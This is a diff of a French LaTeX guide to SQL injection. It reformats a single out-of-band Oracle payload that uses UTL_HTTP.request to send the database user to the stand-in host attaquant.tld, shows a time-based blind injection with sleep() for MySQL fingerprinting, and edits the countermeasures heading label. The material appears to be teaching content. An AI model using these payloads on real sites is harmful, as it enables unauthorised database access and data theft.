@@ -58,9 +58,7 @@ Par exemple, la requête (Oracle) suivante va envoyer des information vers la ma
 \begin{center}
 http://www.monsite.tld/product.php?id=10
 
-||UTL_HTTP.request(‘attaquant.tld:80’
-
-||(SELECT user FROM DUAL)--
+||UTL_HTTP.request(‘attaquant.tld:80’||(SELECT user FROM DUAL)--
 \end{center}
 
 Qui va recevoir le nom de l'utilisateur connecté à la base de données :
@@ -83,7 +81,7 @@ http://www.monsite.tld/product.php?id=10 AND IF(version() like ‘5\%’, sleep(
 
 Ici, l'observation du temps de réponse de la requête indiquera si la cible utilise MySQL 5.X.
 
-\subsection{Contre-mesures}\label{vulnerabilites:web:sqli:countermeasures}
+\subsection{Contre-mesures}
 
 Les contre-mesures sont les suivantes :
 \begin{tabbing}
